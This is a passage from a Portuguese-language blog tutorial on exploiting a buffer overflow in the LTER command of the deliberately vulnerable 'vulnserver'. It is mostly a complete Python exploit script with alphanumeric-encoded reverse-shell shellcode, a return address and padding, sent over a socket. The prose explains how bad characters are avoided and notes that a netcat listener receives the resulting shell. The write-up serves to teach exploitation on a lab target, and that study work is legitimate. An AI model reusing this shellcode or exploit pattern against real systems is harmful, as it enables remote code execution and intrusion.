shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">59"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">6c"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">75"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">65"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">67"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">61"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">34"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">53"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">54"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">42"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">43"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">4b"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">6e"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">37"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">55"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">75"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">4d"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">6b"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">55"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">41"</span>

</pre></table></code></div></div><p>Nosso shellcode ficou consideravelmente maior devido ao encode, mas temos espaço de sobra.</p><p>Note também que utilizei a opção <code class="language-plaintext highlighter-rouge">“bufferregister=esp”</code>, isso por que sem esta opção, o shellcode se inicia com os opcodes “\x89\xe2\xdb\xdb\xd9\x72”. Estes opcodes são necessários para encontrar a posição absoluta do shellcode na memória.</p><p>Como nós já sabemos que nosso shellcode estará em ESP, podemos apontá-lo na criação do shellcode, evitando os badchars.</p><p>Vamos atualizar o exploit.</p><p>xpllter.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># variaveis de payoad
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x48</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x68\x4f\x72\x65\x50\x67\x70\x47\x70\x53\x50</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4d\x59\x6b\x55\x55\x61\x79\x50\x72\x44\x4e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6b\x30\x50\x70\x30\x4c\x4b\x30\x52\x56\x6c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4e\x6b\x31\x42\x64\x54\x6e\x6b\x70\x72\x71</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x38\x36\x6f\x78\x37\x32\x6a\x55\x76\x56\x51</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6b\x4f\x6c\x6c\x65\x6c\x71\x71\x73\x4c\x47</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x72\x36\x4c\x77\x50\x5a\x61\x5a\x6f\x34\x4d</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x57\x71\x5a\x67\x6d\x32\x48\x72\x53\x62\x56</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x37\x4c\x4b\x53\x62\x54\x50\x4c\x4b\x32\x6a</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x55\x6c\x6e\x6b\x42\x6c\x74\x51\x30\x78\x6a</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x43\x57\x38\x56\x61\x4a\x71\x36\x31\x6c\x4b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x51\x49\x75\x70\x35\x51\x6e\x33\x4c\x4b\x37</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x39\x64\x58\x49\x73\x57\x4a\x73\x79\x6e\x6b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x65\x64\x4e\x6b\x77\x71\x6b\x66\x50\x31\x4b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4f\x6e\x4c\x59\x51\x5a\x6f\x54\x4d\x73\x31</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4a\x67\x64\x78\x4b\x50\x42\x55\x6a\x56\x74</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x43\x51\x6d\x78\x78\x37\x4b\x33\x4d\x65\x74</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x43\x45\x4d\x34\x30\x58\x4e\x6b\x36\x38\x51</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x34\x53\x31\x59\x43\x73\x56\x6c\x4b\x54\x4c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\x4b\x6c\x4b\x56\x38\x65\x4c\x33\x31\x4e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x33\x6e\x6b\x64\x44\x4e\x6b\x53\x31\x4a\x70</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6e\x69\x50\x44\x35\x74\x67\x54\x73\x6b\x31</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4b\x53\x51\x66\x39\x72\x7a\x53\x61\x49\x6f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x39\x70\x61\x4f\x31\x4f\x62\x7a\x4e\x6b\x62</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x32\x68\x6b\x4e\x6d\x73\x6d\x50\x68\x45\x63</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\x32\x53\x30\x67\x70\x50\x68\x73\x47\x70</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x73\x75\x62\x33\x6f\x62\x74\x71\x78\x32\x6c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x62\x57\x66\x46\x37\x77\x79\x6f\x69\x45\x6e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x6c\x50\x35\x51\x77\x70\x55\x50\x51\x39</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x7a\x64\x52\x74\x32\x70\x61\x78\x31\x39\x4d</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\x52\x4b\x33\x30\x4b\x4f\x5a\x75\x50\x50</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x30\x50\x30\x50\x36\x30\x73\x70\x72\x70\x37</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x30\x70\x50\x31\x78\x68\x6a\x54\x4f\x79\x4f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x39\x70\x79\x6f\x68\x55\x4e\x77\x62\x4a\x65</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x55\x75\x38\x69\x50\x79\x38\x36\x61\x64\x51</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\x68\x65\x52\x37\x70\x75\x70\x39\x6b\x4d</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x59\x48\x66\x70\x6a\x72\x30\x51\x46\x46\x37</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x53\x58\x7a\x39\x6c\x65\x50\x74\x51\x71\x79</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6f\x6a\x75\x4f\x75\x4b\x70\x44\x34\x56\x6c</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x49\x6f\x30\x4e\x55\x58\x64\x35\x48\x6c\x31</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x78\x7a\x50\x6f\x45\x4c\x62\x76\x36\x4b\x4f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4a\x75\x71\x78\x35\x33\x52\x4d\x71\x74\x55</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\x4d\x59\x69\x73\x36\x37\x53\x67\x43\x67</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\x31\x68\x76\x73\x5a\x54\x52\x70\x59\x50</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x56\x39\x72\x69\x6d\x75\x36\x4a\x67\x37\x34</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x35\x74\x47\x4c\x77\x71\x65\x51\x4c\x4d\x31</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x54\x35\x74\x46\x70\x78\x46\x35\x50\x42\x64</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x66\x34\x70\x50\x32\x76\x42\x76\x36\x36\x50</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x46\x30\x56\x42\x6e\x73\x66\x32\x76\x51\x43</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x66\x36\x51\x78\x34\x39\x4a\x6c\x55\x6f\x4b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x36\x69\x6f\x58\x55\x6e\x69\x4b\x50\x30\x4e</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x71\x46\x42\x66\x49\x6f\x46\x50\x50\x68\x46</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x68\x4f\x77\x45\x4d\x71\x70\x6b\x4f\x38\x55</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4d\x6b\x49\x70\x45\x4d\x47\x5a\x76\x6a\x71</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x78\x6c\x66\x5a\x35\x6d\x6d\x6f\x6d\x69\x6f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4a\x75\x35\x6c\x37\x76\x71\x6c\x55\x5a\x4f</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x70\x4b\x4b\x39\x70\x51\x65\x37\x75\x6f\x4b</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x67\x37\x76\x73\x72\x52\x72\x4f\x63\x5a\x33</span><span class="sh">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x30\x53\x63\x79\x6f\x4b\x65\x41\x41</span><span class="sh">"</span>


<span class="c1"># payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">LTER /.</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">2005</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\x12\x50\x62</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">2005</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="c1"># criando conexao
</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando payload...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Payload enviado.</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Agora vamos setar o netcat para ouvir na porta 8443 e iniciar o vulnserver fora do Immunity.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-89.png" alt="Enumaração do comando." /></p><p>E conseguimos nosso shell.</p><p>Neste comando, tivemos dois grandes problemas: o tamanho do buffer em que caímos, nos obrigando a dar um salto na memória, e uma quantidade limitadíssima de caracterese úteis, nos obrigando a encoder nosso shellcode.</p><p>Em próximas atualizações, exploraremos técnicas mais complexas para explorar buffer overflow.</p><h1 id="conclusão">CONCLUSÃO</h1><p>Neste estudo, pudemos avaliar o programa vulnserver desde seu código fonte, porém em situações reais dificilmente teremos chance de analisar o codigo fonte de um programa.</p><p>Porém, com as técnicas apresentadas neste artigo, é possível fazer o debbug de um programa e encontrar suas vulnerabilidades. Assim como criar estratégias para explorá-las.</p><p>Além das formas apresentadas neste estudo, existem várias outras técnicas mais complexas para explorar as mesmas vulnerabilidades, podemos futuramente adicionar novas técnicas a este estudo para torná-lo mais competo.</p><p>Em todos os exploits utilizados neste estudo, utilizamos um reverse shell, mas tendo em vista que conseguimos controlar o programa a nível de atingir o SO, podemos enviar qualquer outro exploit cujo SO possa ser disponível, tais como bind shell, execussão de comandos, DoS, entre outros.</p><p>No mais, muito obrigado por acompanhar esta PoC, espero que tenha sido útil.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/windows-buffer-overflow/'>Windows Buffer Overflow</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/binary-exploitation/" class="post-tag no-text-decoration" >Binary Exploitation</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >Assembly</a> <a href="/tags/vulnserver/" class="post-tag no-text-decoration" >Vulnserver</a> <a href="/tags/badchars/" class="post-tag no-text-decoration" >Badchars</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão - 